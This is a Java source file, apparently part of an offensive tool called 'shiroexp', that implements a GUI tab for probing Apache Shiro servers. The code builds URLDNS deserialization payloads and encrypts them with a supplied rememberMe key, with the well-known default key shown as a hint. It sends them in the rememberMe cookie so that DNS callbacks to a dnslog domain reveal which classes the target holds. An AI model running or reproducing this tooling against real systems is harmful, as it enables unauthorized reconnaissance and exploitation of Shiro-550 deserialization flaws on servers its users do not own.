package com.y5neko.shiroexp.ui.tabpane;

import com.y5neko.shiroexp.config.AllList;
import com.y5neko.shiroexp.config.GlobalVariable;
import com.y5neko.shiroexp.gadget.FindClassByURLDNS;
import com.y5neko.shiroexp.misc.DnslogConfig;
import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import com.y5neko.shiroexp.ui.dialog.DNSLogQuickCheckDialog;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.concurrent.Task;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.layout.HBox;
import javafx.scene.layout.VBox;
import okhttp3.FormBody;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * URLDNS 类探测 Tab
 * 通过 DNS 请求探测目标是否存在指定依赖类
 */
public class URLDNSTab {
    // 静态引用，用于外部更新UI
    private static URLDNSTab instance;

    private TextField cookieTextField;
    private TextField targetUrlTextField;
    private TextField rememberMeTextField;
    private TextField rememberMeFlagTextField;
    private TextField classFilterTextField; // 探测类过滤输入框
    private ComboBox<String> cryptTypeComboBox;
    private ComboBox<String> requestTypeComboBox;
    private ComboBox<String> classComboBox; // 探测类下拉列表
    private ObservableList<String> allClasses; // 保存完整的类列表，用于过滤

    /**
     * 追加日志并自动滚动到底部的辅助方法
     * @param logTextArea 日志文本框
     * @param text 要追加的文本
     */
    private void appendLogWithScroll(TextArea logTextArea, String text) {
        logTextArea.appendText(text);
        logTextArea.setScrollTop(Double.MAX_VALUE);
    }

    public VBox getURLDNSTab() {
        // 注册实例
        instance = this;
        VBox urlDnsTab = new VBox();
        urlDnsTab.setSpacing(10);
        urlDnsTab.setPadding(new Insets(10));

        // ========================== 第一行：目标地址配置 ==========================
        HBox targetUrlBox = new HBox();
        targetUrlBox.setAlignment(Pos.CENTER);
        targetUrlBox.setSpacing(10);
        targetUrlBox.setPadding(new Insets(0, 0, 10, 0));

        Label requestTypeLabel = new Label("请求方式: ");
        ObservableList<String> requestType = FXCollections.observableArrayList("GET", "POST");
        requestTypeComboBox = new ComboBox<>(requestType);
        requestTypeComboBox.setValue("GET");

        Label targetUrlLabel = new Label("目标地址:");
        targetUrlTextField = new TextField();
        targetUrlTextField.setPromptText("http://example.com");
        HBox.setHgrow(targetUrlTextField, javafx.scene.layout.Priority.ALWAYS);

        targetUrlBox.getChildren().addAll(requestTypeLabel, requestTypeComboBox, targetUrlLabel, targetUrlTextField);

        // ========================== 第二行：RememberMe 配置 ==========================
        HBox rememberMeConfigBox = new HBox();
        rememberMeConfigBox.setAlignment(Pos.CENTER);
        rememberMeConfigBox.setSpacing(10);
        rememberMeConfigBox.setPadding(new Insets(0, 0, 10, 0));

        Label rememberMeKeywordLabel = new Label("Keyword: ");
        rememberMeFlagTextField = new TextField("rememberMe");
        HBox.setHgrow(rememberMeFlagTextField, javafx.scene.layout.Priority.ALWAYS);

        Label rememberMeValueLabel = new Label("指定rememberMe: ");
        rememberMeTextField = new TextField();
        rememberMeTextField.setPromptText("kPH+bIxk5D2deZiIxcaaaA==");
        HBox.setHgrow(rememberMeTextField, javafx.scene.layout.Priority.ALWAYS);

        Label cryptTypeLabel = new Label("加密方式: ");
        ObservableList<String> cryptType = FXCollections.observableArrayList("爆破所有", "CBC", "GCM");
        cryptTypeComboBox = new ComboBox<>(cryptType);
        cryptTypeComboBox.setValue("爆破所有");
        Tooltip tooltip = new Tooltip();
        tooltip.setText("Shiro1.4.2版本后,Shiro的加密模式\n由AES-CBC变为AES-GCM\n\n爆破所有: 同时尝试CBC和GCM模式");
        Tooltip.install(cryptTypeComboBox, tooltip);

        rememberMeConfigBox.getChildren().addAll(rememberMeKeywordLabel, rememberMeFlagTextField, rememberMeValueLabel, rememberMeTextField, cryptTypeLabel, cryptTypeComboBox);

        // ========================== 第二行：类选择 ==========================
        HBox classBox = new HBox();
        classBox.setAlignment(Pos.CENTER);
        classBox.setSpacing(10);
        classBox.setPadding(new Insets(0, 0, 10, 0));

        Label classLabel = new Label("探测类:");

        // 过滤输入框
        classFilterTextField = new TextField();
        classFilterTextField.setPromptText("输入过滤...");
        classFilterTextField.setPrefWidth(150);

        // 初始化完整类列表
        ObservableList<String> classes = FXCollections.observableArrayList("探测所有类");
        classes.addAll(AllList.getAllUrlDnsClasses());
        allClasses = FXCollections.observableArrayList(classes); // 保存完整列表

        classComboBox = new ComboBox<>(classes);
        classComboBox.setValue("探测所有类");
        HBox.setHgrow(classComboBox, javafx.scene.layout.Priority.ALWAYS);

        Button detectButton = new Button("开始探测");

        classBox.getChildren().addAll(classLabel, classFilterTextField, classComboBox, detectButton);

        // 添加过滤功能
        classFilterTextField.textProperty().addListener((observable, oldValue, newValue) -> {
            filterClasses(newValue);
        });

        // ========================== 第三行：DNSLog配置 ==========================
        HBox dnslogConfigBox = new HBox();
        dnslogConfigBox.setAlignment(Pos.CENTER);
        dnslogConfigBox.setSpacing(10);
        dnslogConfigBox.setPadding(new Insets(0, 0, 10, 0));

        Label dnslogDomainLabel = new Label("DNSLog域名:");
        TextField dnslogDomainTextField = new TextField();
        dnslogDomainTextField.setPromptText("留空使用设置中的域名或自动获取");
        HBox.setHgrow(dnslogDomainTextField, javafx.scene.layout.Priority.ALWAYS);

        Button quickCheckButton = new Button("DNSLog结果解析");

        dnslogConfigBox.getChildren().addAll(dnslogDomainLabel, dnslogDomainTextField, quickCheckButton);

        // ========================== 第四行：高级配置 ==========================
        TitledPane advancedConfigPane = new TitledPane();
        advancedConfigPane.setText("高级配置");
        advancedConfigPane.setCollapsible(true);
        advancedConfigPane.setExpanded(false);

        VBox advancedConfigContent = new VBox();
        advancedConfigContent.setSpacing(10);
        advancedConfigContent.setPadding(new Insets(10, 0, 10, 0));

        HBox cookieBox = new HBox();
        cookieBox.setAlignment(Pos.CENTER);
        cookieBox.setSpacing(10);

        Label cookieLabel = new Label("Cookie:");
        cookieTextField = new TextField();
        cookieTextField.setPromptText("例: key=value; key2=value2");
        HBox.setHgrow(cookieTextField, javafx.scene.layout.Priority.ALWAYS);

        cookieBox.getChildren().addAll(cookieLabel, cookieTextField);
        advancedConfigContent.getChildren().add(cookieBox);
        advancedConfigPane.setContent(advancedConfigContent);

        // ========================== 第五行：日志区域 ==========================
        VBox logContainer = new VBox();
        logContainer.setSpacing(10);
        logContainer.setPadding(new Insets(10, 0, 0, 0));
        logContainer.setFillWidth(true);

        TextArea logTextArea = new TextArea();
        logTextArea.setEditable(false);
        logTextArea.setWrapText(true);

        // 按钮区域
        Button clearLogButton = new Button("清空日志");
        HBox buttonBox = new HBox(10);
        buttonBox.setAlignment(Pos.CENTER_RIGHT);
        buttonBox.getChildren().add(clearLogButton);

        // 组装日志区域：TextArea 占据所有可用空间，buttonBox 固定在底部
        logContainer.getChildren().addAll(logTextArea, buttonBox);

        // 关键：让 TextArea 在 logContainer 中占据所有剩余垂直空间
        VBox.setVgrow(logTextArea, javafx.scene.layout.Priority.ALWAYS);

        // 关键：让 logContainer 在主 VBox (urlDnsTab) 中占据所有剩余垂直空间
        VBox.setVgrow(logContainer, javafx.scene.layout.Priority.ALWAYS);

        // ========================== 事件绑定 ==========================
        quickCheckButton.setOnAction(event -> {
            DNSLogQuickCheckDialog dialog = new DNSLogQuickCheckDialog();
            dialog.showAndWait();
        });

        detectButton.setOnMouseClicked(event -> {
            // 验证输入
            if (targetUrlTextField.getText().trim().isEmpty()) {
                appendLogWithScroll(logTextArea, "[EROR]请输入目标地址\n");
                return;
            }

            if (rememberMeTextField.getText().trim().isEmpty()) {
                appendLogWithScroll(logTextArea, "[EROR]请输入 RememberMe Key\n");
                return;
            }

            String selectedClass = classComboBox.getValue();
            if (selectedClass == null || selectedClass.isEmpty()) {
                appendLogWithScroll(logTextArea, "[EROR]请选择要探测的类\n");
                return;
            }

            detectButton.setDisable(true);
            appendLogWithScroll(logTextArea, "[INFO]开始 URLDNS 类探测...\n");

            // 异步执行探测任务
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() {
                    try {
                        // 获取加密方式选择
                        final String selectedCryptType = cryptTypeComboBox.getValue();
                        // 获取请求方式选择
                        final String selectedRequestType = requestTypeComboBox.getValue();

                        // 创建目标对象
                        TargetOBJ targetOBJ = new TargetOBJ(targetUrlTextField.getText().trim());
                        targetOBJ.setKey(rememberMeTextField.getText().trim());
                        targetOBJ.setRememberMeFlag(rememberMeFlagTextField.getText().trim());
                        targetOBJ.setRequestType(selectedRequestType);

                        // 应用高级配置（Cookie）
                        if (cookieTextField != null && !cookieTextField.getText().trim().isEmpty()) {
                            Map<String, String> headers = new HashMap<>();
                            headers.put("Cookie", cookieTextField.getText().trim());
                            targetOBJ.setHeaders(headers);
                        }

                        // 获取 DNSLog 域名
                        String dnslogDomain = dnslogDomainTextField.getText().trim();
                        if (dnslogDomain.isEmpty()) {
                            // 尝试从全局变量获取
                            dnslogDomain = GlobalVariable.getDnslogDomain();
                        }

                        final String[] dnslogInfoHolder = new String[3]; // [domain, key, token]
                        if (dnslogDomain == null || dnslogDomain.isEmpty()) {
                            // 自动获取 DNSLog 域名
                            Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]正在从 dnslog.org 获取域名...\n"));
                            String[] dnslogInfo = DnslogConfig.getDnslogDomain();
                            dnslogDomain = dnslogInfo[0];
                            dnslogInfoHolder[0] = dnslogInfo[0];
                            dnslogInfoHolder[1] = dnslogInfo[1];
                            dnslogInfoHolder[2] = dnslogInfo[2];
                            Platform.runLater(() -> {
                                appendLogWithScroll(logTextArea, "[INFO]DNSLog 域名: " + dnslogInfoHolder[0] + "\n");
                                appendLogWithScroll(logTextArea, "[INFO]查询 Token: " + dnslogInfoHolder[2] + "\n");
                            });
                        } else {
                            final String finalDomain = dnslogDomain;
                            Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]使用配置的 DNSLog 域名: " + finalDomain + "\n"));
                        }

                        // 确定要探测的类列表
                        java.util.List<String> classesToDetect = new java.util.ArrayList<>();
                        if ("探测所有类".equals(selectedClass)) {
                            // 使用getAllUrlDnsClasses获取完整列表（包含自定义类）
                            classesToDetect.addAll(AllList.getAllUrlDnsClasses());
                        } else {
                            classesToDetect.add(selectedClass);
                        }

                        // 预先计算所有类名的后缀映射（基于整个列表的顺序）
                        final java.util.List<String> fullList = AllList.getAllUrlDnsClasses();
                        final java.util.Map<String, String> classNameToIndex = new java.util.HashMap<>();
                        final java.util.Map<String, Integer> classNameCount = new java.util.HashMap<>();

                        // 遍历整个列表，预先计算每个类应该使用的后缀
                        for (String clazz : fullList) {
                            String simpleClassName = clazz.substring(clazz.lastIndexOf('.') + 1);
                            int count = classNameCount.getOrDefault(simpleClassName, 0) + 1;
                            classNameCount.put(simpleClassName, count);

                            // 如果是第2次及以后出现，添加数字后缀
                            if (count > 1) {
                                classNameToIndex.put(clazz, simpleClassName + count);
                            } else {
                                classNameToIndex.put(clazz, simpleClassName);
                            }
                        }

                        // 遍历探测每个类
                        final String finalDnslogDomain = dnslogDomain;
                        for (String clazz : classesToDetect) {
                            Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]正在探测类: " + clazz + "\n"));

                            try {
                                // 生成随机标识符
                                String verifyRandom = Tools.generateRandomString(8);

                                // 提取类名（不含包名）作为 DNS 标识
                                String simpleClassName = clazz.substring(clazz.lastIndexOf('.') + 1);

                                // 从预先计算的映射中获取该类应该使用的后缀
                                simpleClassName = classNameToIndex.getOrDefault(clazz, simpleClassName);

                                // 创建最终副本供lambda使用
                                final String finalSimpleClassName = simpleClassName;

                                // 构建 DNSLog URL：类名-随机值.主域名
                                String dnslogUrl = "http://" + finalSimpleClassName + "-" + verifyRandom + "." + finalDnslogDomain;

                                // 生成 URLDNS payload
                                byte[] payloadBytes = FindClassByURLDNS.genPayload(dnslogUrl, clazz);
                                String payloadBase64 = Base64.getEncoder().encodeToString(payloadBytes);

                                // 根据选择的加密模式决定尝试哪些加密方式
                                boolean tryCBC = "爆破所有".equals(selectedCryptType) || "CBC".equals(selectedCryptType);
                                boolean tryGCM = "爆破所有".equals(selectedCryptType) || "GCM".equals(selectedCryptType);

                                // 发送 CBC 模式 payload
                                if (tryCBC) {
                                    String payload_cbc = Tools.CBC_Encrypt(targetOBJ.getKey(), payloadBase64);
                                    Map<String, String> headers_cbc = new HashMap<>();
                                    String cookieValue_cbc = targetOBJ.getRememberMeFlag() + "=" + payload_cbc;
                                    if (targetOBJ.getHeaders() != null && targetOBJ.getHeaders().containsKey("Cookie")) {
                                        cookieValue_cbc = targetOBJ.getHeaders().get("Cookie") + "; " + cookieValue_cbc;
                                    }
                                    headers_cbc.put("Cookie", cookieValue_cbc);
                                    HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers_cbc, targetOBJ.getRequestType());
                                }

                                // 发送 GCM 模式 payload
                                if (tryGCM) {
                                    String payload_gcm = Tools.GCM_Encrypt(targetOBJ.getKey(), payloadBase64);
                                    Map<String, String> headers_gcm = new HashMap<>();
                                    String cookieValue_gcm = targetOBJ.getRememberMeFlag() + "=" + payload_gcm;
                                    if (targetOBJ.getHeaders() != null && targetOBJ.getHeaders().containsKey("Cookie")) {
                                        cookieValue_gcm = targetOBJ.getHeaders().get("Cookie") + "; " + cookieValue_gcm;
                                    }
                                    headers_gcm.put("Cookie", cookieValue_gcm);
                                    HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers_gcm, targetOBJ.getRequestType());
                                }

                                Platform.runLater(() -> {
                                    appendLogWithScroll(logTextArea, "   -> DNS记录: " + finalSimpleClassName + "-" + verifyRandom + "." + finalDnslogDomain + "\n");
                                });

                                // 如果是单个类探测，等待并查询 DNS 记录
                                if (classesToDetect.size() == 1) {
                                    Platform.runLater(() -> appendLogWithScroll(logTextArea, "[INFO]等待 5 秒后查询 DNS 记录...\n"));
                                    Thread.sleep(5000);

                                    // 这里应该查询 DNSLog 平台，但由于需要保存 token，简化处理
                                    Platform.runLater(() -> {
                                        appendLogWithScroll(logTextArea, "[INFO]探测完成！\n");
                                        appendLogWithScroll(logTextArea, "[提示]请手动访问 DNSLog 平台查询 DNS 记录\n");
                                        appendLogWithScroll(logTextArea, "[提示]如果看到 DNS 请求，说明目标存在该类\n");
                                    });
                                }
                            } catch (Exception e) {
                                final String errorMsg = e.getMessage();
                                Platform.runLater(() -> {
                                    appendLogWithScroll(logTextArea, "[EROR]探测失败: " + clazz + "\n");
                                    if (errorMsg != null) {
                                        appendLogWithScroll(logTextArea, "   -> 错误: " + errorMsg + "\n");
                                    }
                                });
                            }
                        }

                        // 打印类名和 DNS 记录的对应关系
                        Platform.runLater(() -> {
                            appendLogWithScroll(logTextArea, "========================================\n");
                            if (classesToDetect.size() == 1) {
                                // 单个探测：只显示当前类的对应关系
                                String clazz = classesToDetect.get(0);
                                String dnsClassName = classNameToIndex.get(clazz);
                                appendLogWithScroll(logTextArea, "[INFO]探测完成！\n");
                                appendLogWithScroll(logTextArea, "----------\n");
                                appendLogWithScroll(logTextArea, "[完整类名 → DNS记录] 对应关系：\n");
                                appendLogWithScroll(logTextArea, "----------\n");
                                appendLogWithScroll(logTextArea, clazz + "\n");
                                appendLogWithScroll(logTextArea, "  → " + dnsClassName + "\n");
                                appendLogWithScroll(logTextArea, "----------\n");
                                appendLogWithScroll(logTextArea, "[提示]请访问 DNSLog 平台查看 DNS 记录\n");
                                appendLogWithScroll(logTextArea, "[提示]如果看到该 DNS 记录，说明目标存在该类\n");
                            } else {
                                // 批量探测：显示所有类的对应关系
                                appendLogWithScroll(logTextArea, "[INFO]批量探测完成！\n");
                                appendLogWithScroll(logTextArea, "----------\n");
                                appendLogWithScroll(logTextArea, "[完整类名 → DNS记录] 对应关系：\n");
                                appendLogWithScroll(logTextArea, "----------\n");
                                for (java.util.Map.Entry<String, String> entry : classNameToIndex.entrySet()) {
                                    String fullClassName = entry.getKey();
                                    String dnsClassName = entry.getValue();
                                    appendLogWithScroll(logTextArea, fullClassName + "\n");
                                    appendLogWithScroll(logTextArea, "  → " + dnsClassName + "\n");
                                }
                                appendLogWithScroll(logTextArea, "----------\n");
                                appendLogWithScroll(logTextArea, "[提示]请访问 DNSLog 平台查看 DNS 记录\n");
                                appendLogWithScroll(logTextArea, "[提示]如果看到某条 DNS 记录，说明目标存在该类\n");
                                appendLogWithScroll(logTextArea, "[提示]请复制dnslog完整结果到DNSLog结果解析工具进行解析\n");
                            }
                            appendLogWithScroll(logTextArea, "========================================\n");
                        });

                    } catch (Exception e) {
                        final String errorMsg = e.getMessage();
                        Platform.runLater(() -> {
                            appendLogWithScroll(logTextArea, "[EROR]" + (errorMsg != null ? errorMsg : "探测失败") + "\n");
                        });
                    }
                    return null;
                }

                @Override
                protected void succeeded() {
                    detectButton.setDisable(false);
                }

                @Override
                protected void failed() {
                    detectButton.setDisable(false);
                }
            };
            new Thread(task).start();
        });

        clearLogButton.setOnMouseClicked(event -> {
            logTextArea.clear();
        });

        // ========================== 组装界面 ==========================
        urlDnsTab.getChildren().addAll(targetUrlBox, rememberMeConfigBox, classBox, dnslogConfigBox, advancedConfigPane, logContainer);
        return urlDnsTab;
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType) {
        updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, requestType, null);
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法，包含Cookie）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     * @param cookie Cookie值
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType, String cookie) {
        if (targetUrlTextField != null && !targetUrl.trim().isEmpty()) {
            targetUrlTextField.setText(targetUrl);
        }
        if (rememberMeTextField != null && !key.trim().isEmpty()) {
            rememberMeTextField.setText(key);
        }
        if (rememberMeFlagTextField != null && !rememberMeFlag.trim().isEmpty()) {
            rememberMeFlagTextField.setText(rememberMeFlag);
        }
        if (cryptTypeComboBox != null && cryptType != null && !cryptType.trim().isEmpty()) {
            cryptTypeComboBox.setValue(cryptType);
        }
        if (requestTypeComboBox != null && requestType != null && !requestType.trim().isEmpty()) {
            requestTypeComboBox.setValue(requestType);
        }
        if (cookieTextField != null && cookie != null && !cookie.trim().isEmpty()) {
            cookieTextField.setText(cookie);
        }
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法，不包含加密模式和请求方式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag) {
        updateFromShiro550(targetUrl, key, rememberMeFlag, null, null);
    }

    /**
     * 从 Shiro550 Tab 更新配置（公共方法，包含加密模式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     */
    public void updateFromShiro550(String targetUrl, String key, String rememberMeFlag, String cryptType) {
        updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, null);
    }

    /**
     * 静态方法：更新当前实例的配置（包含所有参数）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType) {
        updateFromShiro550Static(targetUrl, key, rememberMeFlag, cryptType, requestType, null);
    }

    /**
     * 静态方法：更新当前实例的配置（包含所有参数和Cookie）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     * @param requestType 请求方式
     * @param cookie Cookie值
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag, String cryptType, String requestType, String cookie) {
        if (instance != null) {
            javafx.application.Platform.runLater(() -> {
                instance.updateFromShiro550(targetUrl, key, rememberMeFlag, cryptType, requestType, cookie);
            });
        }
    }

    /**
     * 静态方法：更新当前实例的配置（包含加密模式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     * @param cryptType 加密模式
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag, String cryptType) {
        updateFromShiro550Static(targetUrl, key, rememberMeFlag, cryptType, null);
    }

    /**
     * 静态方法：更新当前实例的配置（不包含加密模式和请求方式）
     * @param targetUrl 目标地址
     * @param key RememberMe Key
     * @param rememberMeFlag RememberMe Cookie名称
     */
    public static void updateFromShiro550Static(String targetUrl, String key, String rememberMeFlag) {
        updateFromShiro550Static(targetUrl, key, rememberMeFlag, null, null);
    }

    /**
     * 静态方法：更新探测类下拉列表
     * 在用户添加/删除自定义类后调用，实时更新UI
     */
    public static void updateClassList() {
        if (instance == null || instance.classComboBox == null) {
            return;
        }

        Platform.runLater(() -> {
            // 获取最新的完整类列表
            ObservableList<String> newClasses = AllList.getAllUrlDnsClasses();

            // 保留"探测所有类"选项
            ObservableList<String> updatedList = FXCollections.observableArrayList("探测所有类");
            updatedList.addAll(newClasses);

            // 更新完整类列表保存
            instance.allClasses = FXCollections.observableArrayList(updatedList);

            // 保存当前选中的值
            String previousValue = instance.classComboBox.getValue();

            // 如果当前有过滤条件，需要重新应用过滤
            String currentFilter = instance.classFilterTextField.getText();
            if (currentFilter != null && !currentFilter.trim().isEmpty()) {
                instance.filterClasses(currentFilter);
            } else {
                // 更新下拉列表
                instance.classComboBox.setItems(updatedList);

                // 智能恢复之前的选择
                if (updatedList.contains(previousValue)) {
                    instance.classComboBox.setValue(previousValue);
                } else {
                    instance.classComboBox.setValue("探测所有类");
                }
            }
        });
    }

    /**
     * 根据输入过滤类列表
     * @param filterText 过滤文本（大小写不敏感）
     */
    private void filterClasses(String filterText) {
        if (filterText == null || filterText.trim().isEmpty()) {
            // 无过滤条件，显示完整列表
            classComboBox.setItems(allClasses);
            // 保持"探测所有类"为默认选项
            if (!allClasses.contains(classComboBox.getValue())) {
                classComboBox.setValue("探测所有类");
            }
            return;
        }

        // 创建过滤后的列表（始终包含"探测所有类"）
        ObservableList<String> filteredList = FXCollections.observableArrayList("探测所有类");
        String lowerCaseFilter = filterText.toLowerCase();

        // 遍历完整列表，添加匹配的类
        for (String className : allClasses) {
            if ("探测所有类".equals(className)) {
                continue; // 跳过，已经添加到第一位
            }

            // 大小写不敏感的包含匹配
            if (className.toLowerCase().contains(lowerCaseFilter)) {
                filteredList.add(className);
            }
        }

        // 更新下拉列表
        String previousValue = classComboBox.getValue();
        classComboBox.setItems(filteredList);

        // 智能恢复选择：如果之前选择的类仍在过滤后的列表中，保持选中；否则选中"探测所有类"
        if (filteredList.contains(previousValue)) {
            classComboBox.setValue(previousValue);
        } else {
            classComboBox.setValue("探测所有类");
        }
    }
}
